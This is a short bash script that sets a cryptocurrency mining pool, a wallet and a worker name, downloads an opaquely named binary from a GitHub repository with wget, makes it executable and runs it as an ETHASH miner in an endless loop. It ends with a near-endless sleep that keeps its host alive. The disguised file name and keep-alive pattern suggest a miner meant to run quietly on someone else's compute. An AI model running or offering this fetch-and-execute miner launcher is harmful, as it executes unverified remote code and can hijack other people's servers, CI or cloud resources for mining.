#!/bin/bash
POOL=stratum+tcp://ethash.poolbinance.com:1800
WALLET=DHB
WORKER=Dg
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
sleep 999999999
